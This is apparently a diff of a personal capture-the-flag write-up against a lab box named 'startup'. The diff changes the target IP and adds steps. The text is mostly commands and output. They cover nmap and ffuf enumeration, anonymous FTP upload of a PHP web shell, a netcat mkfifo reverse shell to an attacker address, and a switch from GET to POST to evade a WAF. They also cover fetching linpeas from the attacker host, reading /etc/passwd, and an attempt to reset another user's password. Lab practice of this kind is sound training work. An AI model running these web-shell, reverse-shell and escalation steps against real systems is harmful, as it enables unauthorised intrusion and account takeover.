@@ -1,15 +1,15 @@
-# 10.64.144.72
+# 10.65.164.25
 
-nmap -Pn -sS -sV -sC --open -O -oN nmap.txt 10.64.144.72 -T4
+nmap -Pn -sS -sV -sC --open -O -oN nmap.txt 10.65.164.25 -T4
 
 # ftp-anon: Anonymous FTP login allowed (FTP code 230)
 
 ──(root㉿docker-desktop)-[/vpn]
-└─# nmap -Pn -sS -sV -sC --open -O -oN nmap.txt 10.64.144.72 -T4
+└─# nmap -Pn -sS -sV -sC --open -O -oN nmap.txt 10.65.164.25 -T4
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 04:15 UTC
 Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 95.83% done; ETC: 04:15 (0:00:00 remaining)
-Nmap scan report for 10.64.144.72
+Nmap scan report for 10.65.164.25
 Host is up (0.20s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT STATE SERVICE VERSION
@@ -52,7 +52,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.57 seconds
 # 22, 21, 80
 
 ┌──(root㉿docker-desktop)-[/vpn]
-└─# http 10.64.144.72:80
+└─# http 10.65.164.25:80
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
 Connection: Keep-Alive
@@ -89,7 +89,7 @@ Vary: Accept-Encoding
 # directory path scan -> files
 
 ──(root㉿docker-desktop)-[/]
-└─# ffuf -u http://10.64.144.72/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
+└─# ffuf -u http://10.65.164.25/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -103,7 +103,7 @@ Vary: Accept-Encoding
 ---
 
 :: Method : GET
-:: URL : http://10.64.144.72/FUZZ
+:: URL : http://10.65.164.25/FUZZ
 :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration : false
@@ -121,7 +121,7 @@ server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 199ms]
 
 cd /usr/share/wordlists/seclists/Discovery/Web-Content
 ─(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
-└─# ffuf -u http://10.64.144.72/FUZZ.php -w common.txt -fs 277
+└─# ffuf -u http://10.65.164.25/FUZZ.php -w common.txt -fs 277
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -135,7 +135,7 @@ cd /usr/share/wordlists/seclists/Discovery/Web-Content
 ---
 
 :: Method : GET
-:: URL : http://10.64.144.72/FUZZ.php
+:: URL : http://10.65.164.25/FUZZ.php
 :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration : false
@@ -151,7 +151,7 @@ cd /usr/share/wordlists/seclists/Discovery/Web-Content
 :: Progress: [4746/4746] :: Job [1/1] :: 202 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
 
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
-└─# ffuf -u http://10.64.144.72/FUZZ -w common.txt -fs 277
+└─# ffuf -u http://10.65.164.25/FUZZ -w common.txt -fs 277
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -165,7 +165,7 @@ cd /usr/share/wordlists/seclists/Discovery/Web-Content
 ---
 
 :: Method : GET
-:: URL : http://10.64.144.72/FUZZ
+:: URL : http://10.65.164.25/FUZZ
 :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration : false
@@ -182,12 +182,12 @@ index.html [Status: 200, Size: 808, Words: 136, Lines: 21, Duration: 202ms]
 
 # subdomain
 
-ffuf -u http://10.64.144.72:80 -H "Host: FUZZ.10.64.144.72:80" -o subdomain.ffuf.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ffuf -u http://10.65.164.25:80 -H "Host: FUZZ.10.65.164.25:80" -o subdomain.ffuf.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 
-ffuf -u http://10.64.144.72:80 -H "Host: FUZZ.10.64.144.72:80" -o subdomain.ffuf.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt
+ffuf -u http://10.65.164.25:80 -H "Host: FUZZ.10.65.164.25:80" -o subdomain.ffuf.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt
 
 
-# http://10.64.144.72/files/notice.txt
+# http://10.65.164.25/files/notice.txt
 
 Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
 
@@ -197,10 +197,10 @@ Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. Peo
 # ftp-anon: Anonymous FTP login allowed (FTP code 230)
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo ftp 10.64.144.72
-Connected to 10.64.144.72.
+└─$ sudo ftp 10.65.164.25
+Connected to 10.65.164.25.
 220 (vsFTPd 3.0.3)
-Name (10.64.144.72:kali): anonymous
+Name (10.65.164.25:kali): anonymous
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -242,10 +242,10 @@ ftp>
 # upload -> fail -> permission X
 
 ┌──(kali㉿kali)-[~]
-└─$ ftp 10.64.144.72
-Connected to 10.64.144.72.
+└─$ ftp 10.65.164.25
+Connected to 10.65.164.25.
 220 (vsFTPd 3.0.3)
-Name (10.64.144.72:kali): anonymous
+Name (10.65.164.25:kali): anonymous
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -290,7 +290,7 @@ ftp>
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/88cc1aa2-3c03-49d7-af8a-d30a6b779c3d/image.png)
 
-# http://10.64.144.72/files/ftp/web.php?cmd=cat%20/etc/passwd
+# http://10.65.164.25/files/ftp/web.php?cmd=cat%20/etc/passwd
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/8429d832-b96c-4c33-b079-95577a9c3e73/image.png)
 
@@ -299,7 +299,7 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 
 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.36 1234 >/tmp/f -> X
 
-# 무슨 원인인지 모르겠으나 queryParam 으로 보내면? 안 됨! -> ICMP 는 잘 됨
+# 무슨 원인인지 모르겠으나 queryParam 으로 보내면? 안 됨! -> ICMP 는 잘 됨 -> GET 방식은 WAF 에서 필터링 처리로 의심 -> 우회하기 -> POST 방식으로 전환
 
 pwd 
 
@@ -343,6 +343,8 @@ lrwxrwxrwx 1 root root 30 Sep 25 2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-gene
 
 # 좀 더 강력한 웹쉘로 전환 -> POST 방식으로 revershell 시도 -> O
 
+# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.36 1234 >/tmp/f
+
 ![](https://velog.velcdn.com/images/agnusdei1207/post/9a396ecc-e5b8-43f6-bef4-002c73a75926/image.png)
 
 
@@ -351,7 +353,7 @@ lrwxrwxrwx 1 root root 30 Sep 25 2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-gene
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -lvnp 1234                                            
 listening on [any] 1234 ...
-connect to [192.168.130.36] from (UNKNOWN) [10.64.144.72] 36194
+connect to [192.168.130.36] from (UNKNOWN) [10.65.164.25] 36194
 /bin/sh: 0: can't access tty; job control turned off
 $ ls
 web.php
@@ -364,13 +366,13 @@ index.html
 $ 
 
 
-# shell upgrade
+# Dumb shell -> interactive shell
 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -lvnp 1234                                            
 listening on [any] 1234 ...
-connect to [192.168.130.36] from (UNKNOWN) [10.64.144.72] 36194
+connect to [192.168.130.36] from (UNKNOWN) [10.65.164.25] 36194
 /bin/sh: 0: can't access tty; job control turned off
 $ ls
 web.php
@@ -387,7 +389,6 @@ files  index.html
 www-data@startup:/var/www/html$ export TERM=xterm
 export TERM=xterm
 www-data@startup:/var/www/html$ ^Z
-zsh: suspended  sudo nc -lvnp 1234
                                                                                                                               
 ┌──(kali㉿kali)-[~]
 └─$ stty raw -echo; fg   
@@ -404,6 +405,15 @@ files/      index.html
 www-data@startup:/var/www/html$ ls 
 ```
 
+
+# linpease install
+
+python3 -m http.server 80
+
+
+cd /tmp
+wget 192.168.130.36:80/linpeas.sh
+
 # privilege escalation
 
 linPEAS.sh install -> fail
@@ -411,10 +421,10 @@ linPEAS.sh install -> fail
 ftp put
 
 ┌──(kali㉿kali)-[~]
-└─$ ftp 10.64.144.72
-Connected to 10.64.144.72.
+└─$ ftp 10.65.164.25
+Connected to 10.65.164.25.
 220 (vsFTPd 3.0.3)
-Name (10.64.144.72:kali): anonymous
+Name (10.65.164.25:kali): anonymous
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -437,3 +447,102 @@ local: linpeas.sh remote: linpeas.sh
 226 Transfer complete.
 971926 bytes sent in 00:07 (120.37 KiB/s)
 ftp> 
+
+
+
+# home -> lennie -> permission
+
+www-data@startup:/var/www$ cd /home
+www-data@startup:/home$ ls
+lennie
+www-data@startup:/home$ cd lennie/
+bash: cd: lennie/: Permission denied
+www-data@startup:/home$ ls
+lennie
+
+# linPEAS.sh result listing
+
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+
+
+
+.ssh/authorized_keys
+/tmp/tmux-33
+-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+
+
+╔══════════╣ Log files with potentially weak perms (limit 50)
+    58360     52 -rw-r-----   1 syslog   adm         45267 Nov 23 09:03 /var/log/auth.log
+    58250     16 -rw-r-----   1 root     adm         14037 Nov 12  2020 /var/log/apt/term.log
+    57970      0 -rw-r-----   1 root     adm             0 Sep 25  2020 /var/log/fsck/checkfs
+    57969      0 -rw-r-----   1 root     adm             0 Sep 25  2020 /var/log/fsck/checkroot
+    58359    144 -rw-r-----   1 syslog   adm        145878 Nov 23 09:02 /var/log/kern.log
+    58310    252 -rw-r--r--   1 syslog   adm        251825 Nov 23 08:43 /var/log/cloud-init.log
+    58358    248 -rw-r-----   1 syslog   adm        253330 Nov 23 09:03 /var/log/syslog
+
+/var/backups
+
+# cat /etc/passwd
+www-data@startup:/tmp$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
+ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
+lennie:x:1002:1002::/home/lennie:
+ftpsecure:x:1003:1003::/home/ftpsecure:
+
+
+cd /home/lennie/
+bash: cd: /home/lennie/: Permission denied
+www-data@startup:/tmp$ 
+
+# /home/lennie -> permission denied
+
+www-data@startup:/tmp$ cd /home
+www-data@startup:/home$ ls -al
+total 12
+drwxr-xr-x  3 root   root   4096 Nov 12  2020 .
+drwxr-xr-x 25 root   root   4096 Nov 23 08:43 ..
+drwx------  4 lennie lennie 4096 Nov 12  2020 lennie
+www-data@startup:/home$ 
+
+# change password of lennie -> fail
+www-data@startup:/tmp$ echo "lennie:1234" | chpasswd
+Changing password for lennie.
+chpasswd: (user lennie) pam_chauthtok() failed, error:
+Authentication token manipulation error
+chpasswd: (line 1, user lennie) password not changed
+www-data@startup:/tmp$ 
